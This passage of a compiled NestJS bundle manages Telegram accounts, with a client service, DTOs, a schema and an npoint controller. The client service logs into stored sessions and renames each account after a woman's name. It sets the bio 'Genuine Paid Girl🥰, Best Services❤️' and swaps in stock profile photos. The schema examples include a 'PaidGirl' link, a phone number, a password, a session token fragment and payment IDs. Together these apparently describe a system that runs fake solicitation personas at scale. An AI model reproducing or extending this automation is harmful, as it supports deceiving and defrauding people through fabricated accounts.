                            await this.bufferClientService.remove(existingClientUser.mobile);
                            await this.archivedClientService.remove(existingClientUser.mobile);
                        }
                        else {
                            console.log('Not Deleting user');
                        }
                    }
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error, 'Error in Archiving Old Client outer', true);
                console.log("Error in Archiving Old Client");
            }
            this.telegramService.setActiveClientSetup(undefined);
            console.log("Update finished Exitting Exiiting TG Service");
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Update finished`);
            await connection_manager_1.connectionManager.disconnectAll();
        }
        catch (e) {
            (0, parseError_1.parseError)(e, 'Error in updating client session', true);
            this.telegramService.setActiveClientSetup(undefined);
        }
    }
    async updateClient(clientId) {
        const now = Date.now();
        const lastUpdate = this.lastUpdateMap.get(clientId) || 0;
        const cooldownPeriod = 30000;
        if (now - lastUpdate < cooldownPeriod) {
            console.log(`Skipping update for ${clientId} - cooldown period not elapsed. Try again in ${Math.ceil((cooldownPeriod - (now - lastUpdate)) / 1000)} seconds`);
            return;
        }
        const client = await this.findOne(clientId);
        try {
            this.lastUpdateMap.set(clientId, now);
            await cloudinary_1.CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());
            const telegramClient = await connection_manager_1.connectionManager.getClient(client.mobile, { handler: false });
            await (0, Helpers_1.sleep)(2000);
            const me = await telegramClient.getMe();
            if (!me.username || me.username !== client.username || !me.username?.toLowerCase().startsWith(me.firstName.split(' ')[0].toLowerCase())) {
                const client = await this.findOne(clientId);
                const firstName = (client.name).split(' ')[0];
                const middleName = (client.name).split(' ')[1];
                const firstNameCaps = firstName[0].toUpperCase() + firstName.slice(1);
                const middleNameCaps = middleName ? middleName[0].toUpperCase() + middleName.slice(1) : '';
                const baseUsername = `${firstNameCaps}_${middleNameCaps.slice(0, 3)}` + (0, utils_1.fetchNumbersFromString)(clientId);
                const updatedUsername = await telegramClient.updateUsername(baseUsername);
                await this.update(client.clientId, { username: updatedUsername });
            }
            await (0, Helpers_1.sleep)(1000);
            if (me.firstName !== client.name) {
                await telegramClient.updateProfile(client.name, "Genuine Paid Girl🥰, Best Services❤️");
            }
            await (0, Helpers_1.sleep)(1000);
            await telegramClient.deleteProfilePhotos();
            await (0, Helpers_1.sleep)(1000);
            await telegramClient.updatePrivacy();
            await (0, Helpers_1.sleep)(1000);
            const rootPath = process.cwd();
            console.log(rootPath, "trying to update dp");
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));
            await (0, Helpers_1.sleep)(1000);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));
            await (0, Helpers_1.sleep)(1000);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));
            await (0, Helpers_1.sleep)(1000);
        }
        catch (error) {
            this.lastUpdateMap.delete(clientId);
            (0, parseError_1.parseError)(error);
        }
        finally {
            connection_manager_1.connectionManager.unregisterClient(client.mobile);
        }
    }
    async updateClients() {
        const clients = await this.findAll();
        for (const client of clients) {
            await this.updateClient(client.clientId);
        }
    }
    async generateNewSession(phoneNumber, attempt = 1) {
        try {
            console.log("String Generation started");
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=String Generation started for NewNumber:${phoneNumber}`);
            await (0, Helpers_1.sleep)(1000);
            const response = await (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.uptimebot}/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);
            if (response) {
                console.log(`Code Sent successfully`, response.data);
                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Code Sent successfully`);
                await this.bufferClientService.update(phoneNumber, { availableDate: (new Date(Date.now() + (24 * 60 * 60 * 1000))).toISOString().split('T')[0] });
            }
            else {
                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Failed to send Code`);
                console.log("Failed to send Code", response);
                if (attempt < 2) {
                    await (0, Helpers_1.sleep)(8000);
                    await this.generateNewSession(phoneNumber, attempt + 1);
                }
            }
        }
        catch (error) {
            console.log(error);
            if (attempt < 2) {
                await (0, Helpers_1.sleep)(8000);
                await this.generateNewSession(phoneNumber, attempt + 1);
            }
        }
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.clientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async addPromoteMobile(clientId, mobileNumber) {
        return this.clientModel.findOneAndUpdate({ clientId }, { $addToSet: { promoteMobile: mobileNumber } }, { new: true }).exec();
    }
    async removePromoteMobile(clientId, mobileNumber) {
        return this.clientModel.findOneAndUpdate({ clientId }, { $pull: { promoteMobile: mobileNumber } }, { new: true }).exec();
    }
};
exports.ClientService = ClientService;
exports.ClientService = ClientService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(client_schema_1.Client.name)),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => buffer_client_service_1.BufferClientService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => archived_client_service_1.ArchivedClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        buffer_client_service_1.BufferClientService,
        users_service_1.UsersService,
        archived_client_service_1.ArchivedClientService,
        npoint_service_1.NpointService])
], ClientService);


/***/ }),

/***/ "./src/components/clients/dto/create-client.dto.ts":
/*!*********************************************************!*\
  !*** ./src/components/clients/dto/create-client.dto.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateClientDto {
}
exports.CreateClientDto = CreateClientDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "channelLink", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Database collection name' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "dbcoll", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "link", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Shruthi Reddy', description: 'Name of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '+916265240911', description: 'Phone number of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Ajtdmwajt1@', description: 'Password of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "repl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "promoteRepl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuMTA4LjUg==', description: 'Session token' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Username of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "deployKey", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Main account of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "mainAccount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'booklet_10', description: 'Product associated with the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "product", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ['916265240911'], description: 'Promote mobile number of the user', required: false, type: [String] }),
    __metadata("design:type", Array)
], CreateClientDto.prototype, "promoteMobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'paytmqr281005050101xv6mfg02t4m9@paytm', description: 'Paytm QR ID of the user', required: false }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "qrId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'myred1808@postbank', description: 'Google Pay ID of the user', required: false }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "gpayId", void 0);


/***/ }),

/***/ "./src/components/clients/dto/search-client.dto.ts":
/*!*********************************************************!*\
  !*** ./src/components/clients/dto/search-client.dto.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchClientDto {
}
exports.SearchClientDto = SearchClientDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Client ID of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.Matches)(/^[a-z0-9_-]{3,50}$/i, { message: 'Invalid client ID format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Database collection name' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "dbcoll", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Channel link of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "channelLink", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Link of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "link", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Name of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Phone number of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.Matches)(/^\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "number", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Password of the client' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Repl link of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "repl", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Promotion Repl link of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "promoteRepl", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Clientname of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "clientName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Deployment key URL' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "deployKey", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Main account of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "mainAccount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Product associated with the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "product", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Promote mobile numbers of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.map((v) => v?.trim())),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.ArrayNotEmpty)({ message: 'Promote mobile numbers must not be empty if provided' }),
    (0, class_validator_1.Matches)(/^\+?[0-9]{10,15}$/, { each: true, message: 'Invalid phone number format in promoteMobile' }),
    __metadata("design:type", Array)
], SearchClientDto.prototype, "promoteMobile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Paytm QR ID of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "qrId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Google Pay ID of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "gpayId", void 0);


/***/ }),

/***/ "./src/components/clients/dto/update-client.dto.ts":
/*!*********************************************************!*\
  !*** ./src/components/clients/dto/update-client.dto.ts ***!
  \*********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_client_dto_1 = __webpack_require__(/*! ./create-client.dto */ "./src/components/clients/dto/create-client.dto.ts");
class UpdateClientDto extends (0, swagger_1.PartialType)(create_client_dto_1.CreateClientDto) {
}
exports.UpdateClientDto = UpdateClientDto;


/***/ }),

/***/ "./src/components/clients/schemas/client.schema.ts":
/*!*********************************************************!*\
  !*** ./src/components/clients/schemas/client.schema.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientSchema = exports.Client = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let Client = class Client {
};
exports.Client = Client;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "channelLink", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Database collection name' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "dbcoll", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "link", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Shruthi Reddy', description: 'Name of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '916265240911', description: 'mobile number of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Ajtdmwajt1@', description: 'Password of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "repl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "promoteRepl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuM==', description: 'Session token' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Username of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "deployKey", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Main account of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "mainAccount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'booklet_10', description: 'Product associated with the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "product", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ['916265240911'], description: 'Promote mobile number of the user' }),
    (0, mongoose_1.Prop)({ required: true, type: [String] }),
    __metadata("design:type", Array)
], Client.prototype, "promoteMobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'paytmqr281005050101xv6mfg02t4m9@paytm', description: 'Paytm QR ID of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "qrId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'myred1808@postbank', description: 'Google Pay ID of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "gpayId", void 0);
exports.Client = Client = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'clients', versionKey: false, autoIndex: true, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], Client);
exports.ClientSchema = mongoose_1.SchemaFactory.createForClass(Client);


/***/ }),

/***/ "./src/components/n-point/npoint.controller.ts":
/*!*****************************************************!*\
  !*** ./src/components/n-point/npoint.controller.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.NpointController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const npoint_service_1 = __webpack_require__(/*! ./npoint.service */ "./src/components/n-point/npoint.service.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let NpointController = class NpointController {
    constructor(npointService) {
        this.npointService = npointService;
    }
    async fetchDocument(id) {
        try {
            return await this.npointService.fetchDocument(id);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async postDocument(document) {
        try {
            return await this.npointService.postDocument(document);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async fetchAllDocuments() {
        try {
            return await this.npointService.fetchAllDocuments();
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async updateDocument(id, updatedDocument) {
        try {
            return await this.npointService.updateDocument(id, updatedDocument);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
};
exports.NpointController = NpointController;
__decorate([
    (0, common_1.Get)('documents/:id'),
    (0, swagger_1.ApiOperation)({ summary: 'Fetch a document by ID' }),
    (0, swagger_1.ApiParam)({ name: 'id', description: 'The ID of the document to fetch' }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Document fetched successfully',
    }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Document not found' }),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], NpointController.prototype, "fetchDocument", null);
__decorate([
    (0, common_1.Post)('documents'),
    (0, swagger_1.ApiOperation)({ summary: 'Post a new document' }),
    (0, swagger_1.ApiBody)({
        description: 'The document to post',
        schema: {
            example: {
                title: 'My Document',
                content: 'This is the content of the document.',
            },
        },
    }),
    (0, swagger_1.ApiResponse)({
        status: 201,
        description: 'Document posted successfully',
    }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid input' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], NpointController.prototype, "postDocument", null);
__decorate([
    (0, common_1.Get)('documents'),
    (0, swagger_1.ApiOperation)({ summary: 'Fetch all documents' }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'List of all documents fetched successfully',
    }),
    (0, swagger_1.ApiResponse)({ status: 500, description: 'Internal server error' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], NpointController.prototype, "fetchAllDocuments", null);
__decorate([
    (0, common_1.Put)('documents/:id'),
    (0, swagger_1.ApiOperation)({ summary: 'Update a document by ID' }),
    (0, swagger_1.ApiParam)({ name: 'id', description: 'The ID of the document to update' }),
    (0, swagger_1.ApiBody)({
        description: 'The updated document',
        schema: {
            example: {
                title: 'Updated Document',
                content: 'This is the updated content of the document.',
            },
        },
    }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Document updated successfully',
    }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Document not found' }),
    __param(0, (0, common_1.Param)('id')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], NpointController.prototype, "updateDocument", null);
exports.NpointController = NpointController = __decorate([
    (0, swagger_1.ApiTags)('NPoint API'),
    (0, common_1.Controller)('npoint'),
    __metadata("design:paramtypes", [npoint_service_1.NpointService])
], NpointController);


/***/ }),

/***/ "./src/components/n-point/npoint.module.ts":
/*!*************************************************!*\
  !*** ./src/components/n-point/npoint.module.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.NpointModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const npoint_service_1 = __webpack_require__(/*! ./npoint.service */ "./src/components/n-point/npoint.service.ts");
const npoint_controller_1 = __webpack_require__(/*! ./npoint.controller */ "./src/components/n-point/npoint.controller.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let NpointModule = class NpointModule {
};
exports.NpointModule = NpointModule;
exports.NpointModule = NpointModule = __decorate([
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
        ],
        controllers: [npoint_controller_1.NpointController],
        providers: [npoint_service_1.NpointService],
        exports: [npoint_service_1.NpointService]
    })
], NpointModule);


/***/ }),

/***/ "./src/components/n-point/npoint.service.ts":
/*!**************************************************!*\
  !*** ./src/components/n-point/npoint.service.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
var NpointService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.NpointService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
let NpointService = NpointService_1 = class NpointService {
    constructor() {
        this.logger = new common_1.Logger(NpointService_1.name);
        this.csrfToken = null;
